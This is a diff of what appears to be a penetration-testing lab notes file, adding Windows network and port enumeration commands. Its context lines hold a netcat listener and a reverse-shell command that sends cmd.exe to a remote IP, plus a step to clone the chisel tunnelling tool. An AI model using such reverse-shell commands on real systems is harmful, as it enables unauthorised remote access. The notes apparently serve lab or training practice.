@@ -61,6 +61,14 @@ nc -nvlp 8001
 nc64.exe 10.10.14.34 8001 -e cmd.exe
 ==========(7)======================================================================================================================
 dir /p/w
+ipconfig
+/*powershell
+netstat -nat | Select-String LISTEN
+netstat -nat | ForEach-Object { $_ } | Where-Object { $_ -match "LISTEN" }
+Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" }
+*/
+
+netstat -nat | findstr "LISTEN"
 
 /* compile chisel
 git clone https://github.com/jpillora/chisel.git
